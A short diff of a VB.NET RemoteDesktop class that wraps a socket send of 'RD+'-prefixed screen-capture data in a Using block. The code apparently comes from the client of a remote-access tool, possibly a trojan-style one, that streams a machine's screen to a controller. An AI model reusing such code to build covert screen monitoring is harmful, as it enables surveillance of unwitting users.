@@ -34,18 +34,16 @@ Public Class RemoteDesktop
 
             Try
                 SyncLock ClientSocket.S
-                    Dim MEM As New IO.MemoryStream
-                    Dim Bb As Byte() = SB(("RD+" + ClientSocket.SPL + BS(MS.ToArray)))
-                    Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
+                    Using MEM As New IO.MemoryStream
+                        Dim Bb As Byte() = SB(("RD+" + ClientSocket.SPL + BS(MS.ToArray)))
+                        Dim L As Byte() = SB(Bb.Length & CChar(vbNullChar))
 
-                    MEM.Write(L, 0, L.Length)
-                    MEM.Write(Bb, 0, Bb.Length)
+                        MEM.Write(L, 0, L.Length)
+                        MEM.Write(Bb, 0, Bb.Length)
 
-                    ClientSocket.S.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
-                    ClientSocket.S.Send(MEM.ToArray, 0, MEM.Length, Net.Sockets.SocketFlags.None)
-
-                    MEM.Flush()
-                    MEM.Dispose()
+                        ClientSocket.S.Poll(-1, Net.Sockets.SelectMode.SelectWrite)
+                        ClientSocket.S.Send(MEM.ToArray, 0, MEM.Length, Net.Sockets.SocketFlags.None)
+                    End Using
                 End SyncLock
             Catch ex As Exception
                 ClientSocket.isConnected = False
